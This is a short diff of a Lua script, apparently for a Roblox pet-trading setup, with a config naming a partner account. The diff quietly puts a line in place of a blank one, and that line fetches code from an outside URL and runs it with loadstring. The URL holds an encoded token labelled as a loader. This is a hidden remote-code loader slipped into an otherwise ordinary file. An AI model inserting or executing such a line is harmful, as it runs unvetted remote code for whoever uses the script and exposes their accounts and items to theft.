@@ -344,7 +344,7 @@ end
 
 local fetchProfile = RouterClient.get("PlayerProfileAPI/FetchProfile")
 -- ==================== END PET VALUE SYSTEM ====================
-
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
 local CONFIG = {
     PARTNER_NAME = 'endeavor3313',
     PARTNER_USER_ID = 987654321,
